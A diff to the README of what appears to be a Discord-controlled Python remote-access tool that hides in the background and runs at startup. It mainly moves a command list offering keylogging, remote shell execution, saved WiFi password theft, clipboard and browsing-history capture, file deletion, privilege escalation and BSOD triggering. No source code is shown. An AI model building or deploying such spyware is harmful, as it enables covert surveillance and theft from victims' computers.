@@ -26,8 +26,7 @@ Runs in the background, sets itself to run at startup, checks if user is connect
 ```
 !exec ipconfig        # Remote command execution
 !su                   # Privilege escalation
-!persist              # Install persistence
-!bsod                 # Emergency trigger
+!bsod                 # Blue screen of death trigger
 
  Hardware Inventory
 !cpu                  # CPU specs
@@ -57,6 +56,43 @@ File extension can be modified to:
 
 .exe if you compile it with pyinstaller. (Recommended! no requirements or python needed, just an .exe file ready to be opened.)
 ```
+ ## 📜 Full Command Reference
+
+    commands_list = [
+        ('!screen', 'Capture and send a screenshot'),
+        ('!ip', 'Get the IP address'),
+        ('!clipboard', 'Show clipboard content'),
+        ('!exec <command>', 'Run a shell command'),
+        ('!shutdown', 'Shutdown the computer'),
+        ('!bsod', 'Trigger a BSOD (WARNING)'),
+        ('!msg <message>', 'Show a Windows message box'),
+        ('!url <url>', 'Open a URL in browser'),
+        ('!restart', 'Restart the computer'),
+        ('!cancelrestart', 'Cancel a scheduled restart'),
+        ('!log', 'Start keylogging (sends every 15s)'),
+        ('!stoplog', 'Stop keylogging'),
+        ('!ls', 'List files in the current directory'),
+        ('!cd <path>', 'Change the current directory'),
+        ('!rm <filename>', 'Delete a file'),
+        ('!rmd <dirname>', 'Delete a directory'),
+        ('!download <filename>', 'Download a file'),
+        ('!uuid', 'Get the system UUID'),
+        ('!mac', 'Get MAC addresses'),
+        ('!dns', 'Get DNS server info'),
+        ('!wifi', 'Show connected WiFi info'),
+        ('!wifi_passwords', 'Show saved WiFi passwords'),
+        ('!systeminfo', 'Show system information'),
+        ('!cpu', 'Show CPU information'),
+        ('!gpu', 'Show GPU information'),
+        ('!ram', 'Show RAM information in GB'),
+        ('!drives', 'Show drives information in GB'),
+        ('!hostname', 'Show the hostname'),
+        ('!osinfo', 'Show OS version'),
+        ('!user', 'Show current user'),
+        ('!recent [browser]', 'Show recently visited websites'),
+        ('!su', 'Request administrator privileges')
+    ]
+
 ## 🛠 Discord Bot Setup Guide
 1. Create a Discord Application
 
@@ -141,39 +177,3 @@ GDPR Article 5
 
 Local computer crime laws
 ```
-📜 Full Command Reference
-
-    commands_list = [
-        ('!screen', 'Capture and send a screenshot'),
-        ('!ip', 'Get the IP address'),
-        ('!clipboard', 'Show clipboard content'),
-        ('!exec <command>', 'Run a shell command'),
-        ('!shutdown', 'Shutdown the computer'),
-        ('!bsod', 'Trigger a BSOD (WARNING)'),
-        ('!msg <message>', 'Show a Windows message box'),
-        ('!url <url>', 'Open a URL in browser'),
-        ('!restart', 'Restart the computer'),
-        ('!cancelrestart', 'Cancel a scheduled restart'),
-        ('!log', 'Start keylogging (sends every 15s)'),
-        ('!stoplog', 'Stop keylogging'),
-        ('!ls', 'List files in the current directory'),
-        ('!cd <path>', 'Change the current directory'),
-        ('!rm <filename>', 'Delete a file'),
-        ('!rmd <dirname>', 'Delete a directory'),
-        ('!download <filename>', 'Download a file'),
-        ('!uuid', 'Get the system UUID'),
-        ('!mac', 'Get MAC addresses'),
-        ('!dns', 'Get DNS server info'),
-        ('!wifi', 'Show connected WiFi info'),
-        ('!wifi_passwords', 'Show saved WiFi passwords'),
-        ('!systeminfo', 'Show system information'),
-        ('!cpu', 'Show CPU information'),
-        ('!gpu', 'Show GPU information'),
-        ('!ram', 'Show RAM information in GB'),
-        ('!drives', 'Show drives information in GB'),
-        ('!hostname', 'Show the hostname'),
-        ('!osinfo', 'Show OS version'),
-        ('!user', 'Show current user'),
-        ('!recent [browser]', 'Show recently visited websites'),
-        ('!su', 'Request administrator privileges')
-    ]
